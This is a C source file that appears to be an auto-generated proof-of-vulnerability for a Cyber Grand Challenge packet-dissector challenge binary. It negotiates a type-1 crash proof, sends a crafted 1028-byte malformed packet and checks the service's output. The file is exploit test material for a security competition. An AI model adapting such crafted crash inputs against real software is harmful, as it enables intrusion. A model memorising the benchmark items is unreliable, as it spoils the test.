#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\x04\x04\x00\x00";
      static unsigned int write_00000_00000_len = 4;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x01\x00\x00\x00\x01\x00\x00\x00\xf0\x03\x00\x00\xe8\x03\x00\x00"
         "\x00\x00\x00\x00\x00\x00\x00\x00\xe8\x03\x00\x00\x83\x88\x8f\xc4"
         "\xdd\xed\x8f\x7b\x46\xcc\xbf\x8a\x2c\x01\x00\x00\x00\x70\x80\x8d"
         "\xe7\x0d\xc2\x1c\xa7\xfb\x93\xbf\xe6\xe7\xe8\x42\xfe\x9d\xd7\xd3"
         "\xb3\x60\x9f\x6f\x8f\x4e\x83\x4b\x43\x77\x56\xaf\xf6\x39\xdb\x8a"
         "\x03\x79\x5d\xfc\xb4\x51\xc0\xed\x4d\x21\x61\x31\xc8\xa9\xda\x4a"
         "\x73\xb6\xa1\x4c\xf2\x17\xd3\x78\x7e\x53\x60\xc3\x52\x09\x55\x4a"
         "\xd2\x33\xaa\xbb\x15\x08\x50\x20\x48\x65\x29\x49\x48\x18\xd0\xe0"
         "\x91\x38\x69\xf1\x38\x04\xd3\x1c\x17\x3d\xdd\xbf\x72\xc8\xcf\xef"
         "\x3a\xaf\xa8\x97\x77\xcc\x5b\xbd\xda\x0f\x95\x62\xca\x02\x3a\x0e"
         "\x3b\xf8\xad\x3e\x28\x9a\x22\x88\x57\xcc\xea\x88\x72\xfe\xb2\x9a"
         "\x16\xac\xa5\x3c\x46\x48\x4d\xa7\xba\x5e\xf7\x43\xb7\xe8\xe0\x2a"
         "\xbd\x37\xd0\xf9\x7b\xb1\xc8\x60\x38\x32\x9c\x75\x3a\xc4\xcf\xa9"
         "\x51\x10\x8a\x2d\x2c\x90\x27\xdf\x97\x9e\xd1\x53\xc7\x18\x25\xc6"
         "\x08\x6f\xd5\x34\x18\xe1\x51\x0f\x7f\xcb\x24\x4f\x05\x15\x17\x04"
         "\xeb\x0c\x60\x2e\x3a\x77\x02\x4a\xe4\x20\xc9\x6a\xe9\xce\x05\x6a"
         "\x59\xdb\xe3\xc8\x3d\x21\xa5\xde\x7e\xe6\x12\x18\x75\x75\x49\x7e"
         "\x76\xe3\xf0\x47\xec\x20\x57\x6e\x1f\x00\xd8\xad\xcd\xed\x25\x9e"
         "\xc2\xbb\xd3\xf1\x54\x56\xda\x67\xd5\x46\x5f\xa1\xd4\xc1\x2b\xab"
         "\x74\xaf\x0b\xc3\x69\x57\x9f\xfb\x4f\x11\x02\xcd\xd9\x9f\xe6\x3c"
         "\xd8\x06\xdd\x09\x6e\xf4\xea\xee\xe0\x12\x4c\x8b\x1f\x00\x21\x93"
         "\x98\x1f\x00\x5e\x84\x5b\xf1\x80\x31\xbf\x75\xbf\x33\xe2\x90\x90"
         "\xbd\xa0\x3b\xa0\xd5\xd2\x1c\x6a\x41\xcd\x45\x4a\x03\x34\xe8\x70"
         "\x27\xdc\x86\x67\x53\xb3\xe2\x28\x3f\x4a\x2a\x48\x8d\x66\x59\x56"
         "\x98\x3d\xad\xa3\xf5\x5f\x4f\xf1\x5b\xb0\xdb\x0c\x14\x3a\xa8\xc0"
         "\x59\xe4\xcf\x44\xa8\x58\x2a\xee\x51\x37\xf5\xd9\x8d\x7f\x85\x77"
         "\xfc\x60\x57\x96\x3b\x04\x49\x9f\x14\x97\x83\xd7\x5c\x43\x02\x24"
         "\xef\x14\x85\xcf\x38\x32\x06\xb5\xc9\x20\x96\x62\xad\x42\x12\x40"
         "\xd9\x0f\x82\xeb\xd5\x20\x92\x58\xd7\x4f\x88\xcd\x68\xb3\xd7\xb4"
         "\x9b\x36\x35\xc7\xd3\x6c\x47\x0c\xcf\x89\xa7\x2f\x0d\x61\xa4\x48"
         "\x3d\x7e\x27\x1c\xc6\x2c\x5b\x2a\x50\x46\xe0\xbf\x30\x7e\xb9\x45"
         "\xa6\xce\x4f\x1d\xd2\x4e\xa1\xa3\x07\xe6\x73\x39\x75\xee\x9f\xab"
         "\xb8\xd7\x69\x46\x3a\x00\x38\x50\x6b\xbc\x93\xcf\x30\x60\x3d\x10"
         "\x1c\x6e\x5e\xe2\x95\xd7\x2e\xd7\x07\x05\x36\xeb\xc8\xf9\x71\xe7"
         "\x38\xc2\x98\xf1\x61\x0b\x3a\x0d\xbf\x5a\x40\xbd\xdd\xab\xf0\x31"
         "\x37\x9a\xd7\x71\xff\x47\x56\x6f\x45\x48\x85\xb5\xef\xd3\x81\x9b"
         "\xe4\x05\xc6\x39\x01\x6f\xae\x47\x3e\x34\xf0\x88\x70\x7e\xbc\x07"
         "\x65\x4b\xa2\xdc\xcf\xd5\xff\x62\xc7\x5c\x04\xa3\xaf\x2d\x7c\x86"
         "\xe8\x68\x93\x87\x29\x47\xd1\x45\xfe\xb9\x7c\x64\x13\xd2\x7c\x0b"
         "\x5b\x51\x3c\xb3\x3f\x56\x56\x9f\xe7\x4d\x35\xe1\x7b\x57\xb4\xa9"
         "\xc3\x62\x48\xca\x97\x80\xbf\xb7\x97\x80\x07\x0f\xb0\xa9\xe9\x92"
         "\x94\x1a\x1c\x36\x69\x22\x24\x7a\xd4\x7c\x11\x44\x05\x13\x9e\xfe"
         "\x03\x28\x4a\xe9\x6b\xb9\xe7\x04\xe3\xa4\xa6\xe9\x45\x2c\x41\x23"
         "\xeb\xee\xa3\x60\x2e\x69\x2b\xf5\x2c\xa4\x95\x33\xdb\x09\x5d\xa4"
         "\x0a\x1e\x8e\xb8\x0e\xda\x72\xee\x8c\x14\xdc\xca\x1d\x2b\xa7\xe9"
         "\xb9\x64\xc0\x38\xb5\x3e\x07\x3e\x18\x6a\x60\xfa\x30\x55\x18\x8b"
         "\x6d\xa3\x23\xae\x5e\x6f\x34\xb5\x7a\xc1\xd6\x3d\xb1\x32\x02\x98"
         "\x54\xac\xdc\x22\x33\xa9\x02\x7d\x69\xf1\x6c\x72\x12\x5d\x25\xfd"
         "\x1e\x0b\xbd\xf8\x7d\xaa\x17\xb3\x9e\xf2\x50\x6f\xf9\x19\x44\xe5"
         "\x00\x4e\xaa\x87\x84\xfb\xbe\x7d\xe3\xc5\x3a\x51\xba\x1b\x74\x53"
         "\x39\x4b\x6a\xc0\xed\x6c\x44\x11\x60\x46\xe3\x3e\x44\x29\xf1\xfb"
         "\xa2\xe2\xdc\x63\x4c\x55\x79\xe1\x39\xa1\xc7\xaa\x57\xce\x51\x43"
         "\x97\x8c\x3d\x2c\x41\x04\xd5\x28\x80\xbf\xf3\x0d\x46\x64\xd2\x9c"
         "\x12\x68\xc2\x57\x26\x8e\xbe\x84\x26\x9d\x3f\x86\x2b\x5b\xa4\x09"
         "\x32\x05\x05\x5e\x1a\x59\xb0\xf2\xdd\x8f\x4f\x5b\xc0\xab\x9d\x38"
         "\x9a\xe6\xca\x5f\x4a\x84\xab\xd2\x2f\x66\x0f\x1a\xd7\x96\xdf\xd5"
         "\x28\xa6\x7d\xf2\x53\x25\x1a\x80\xa5\xb1\x29\x62\x1a\x99\xda\x73"
         "\x8e\x26\x43\x04\x61\x9a\x48\x82\x7d\xee\x07\xa1\xf7\x37\x0c\xe6"
         "\x8b\x01\xd2\xf8\x74\xbd\x81\x51\x4e\x01\x71\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20";
      static unsigned int write_00001_00000_len = 1028;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x53\x74\x61\x72\x74\x69\x6e\x67\x20\x64\x69\x73\x73\x65\x63\x74"
         "\x69\x6f\x6e\x2e\x2e\x2e";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 22);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x3d\x3d\x3d\x3d\x0a";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = cgc_delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 5);
      if (read_00001_res) {} //silence unused variable warning
      /* read match pcre:
.*New Packet
*/
      static char read_00001_00000_regex[] = 
         "\x2e\x2a\x4e\x65\x77\x20\x50\x61\x63\x6b\x65\x74";
      static match_result read_00001_00000_match;
      pcre *read_00001_00000_pcre = cgc_init_regex(read_00001_00000_regex);
      if (read_00001_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00001_00000_pcre, 0, read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, &read_00001_00000_match);
         if (rc > 0) {
            read_00001_ptr += read_00001_00000_match.match_end - read_00001_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00001_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = cgc_delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 4);
      if (read_00002_res) {} //silence unused variable warning
      /* read match pcre:
.*===lol
*/
      static char read_00002_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6f\x6c";
      static match_result read_00002_00000_match;
      pcre *read_00002_00000_pcre = cgc_init_regex(read_00002_00000_regex);
      if (read_00002_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00002_00000_pcre, 0, read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, &read_00002_00000_match);
         if (rc > 0) {
            read_00002_ptr += read_00002_00000_match.match_end - read_00002_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00002_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** delimited read
      static unsigned char read_00003_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00003 = NULL;
      read_00003_len = 0;
      int read_00003_res = cgc_delimited_read(0, &read_00003, &read_00003_len, read_00003_delim, 4);
      if (read_00003_res) {} //silence unused variable warning
      /* read match pcre:
.*===unconvenedperpetually
*/
      static char read_00003_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x75\x6e\x63\x6f\x6e\x76\x65\x6e\x65\x64\x70"
         "\x65\x72\x70\x65\x74\x75\x61\x6c\x6c\x79";
      static match_result read_00003_00000_match;
      pcre *read_00003_00000_pcre = cgc_init_regex(read_00003_00000_regex);
      if (read_00003_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00003_00000_pcre, 0, read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, &read_00003_00000_match);
         if (rc > 0) {
            read_00003_ptr += read_00003_00000_match.match_end - read_00003_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00003_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** delimited read
      static unsigned char read_00004_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00004 = NULL;
      read_00004_len = 0;
      int read_00004_res = cgc_delimited_read(0, &read_00004, &read_00004_len, read_00004_delim, 4);
      if (read_00004_res) {} //silence unused variable warning
      /* read match pcre:
.*Dissection finished
*/
      static char read_00004_00000_regex[] = 
         "\x2e\x2a\x44\x69\x73\x73\x65\x63\x74\x69\x6f\x6e\x20\x66\x69\x6e"
         "\x69\x73\x68\x65\x64";
      static match_result read_00004_00000_match;
      pcre *read_00004_00000_pcre = cgc_init_regex(read_00004_00000_regex);
      if (read_00004_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00004_00000_pcre, 0, read_00004 + read_00004_ptr, read_00004_len - read_00004_ptr, &read_00004_00000_match);
         if (rc > 0) {
            read_00004_ptr += read_00004_00000_match.match_end - read_00004_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00004_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
}
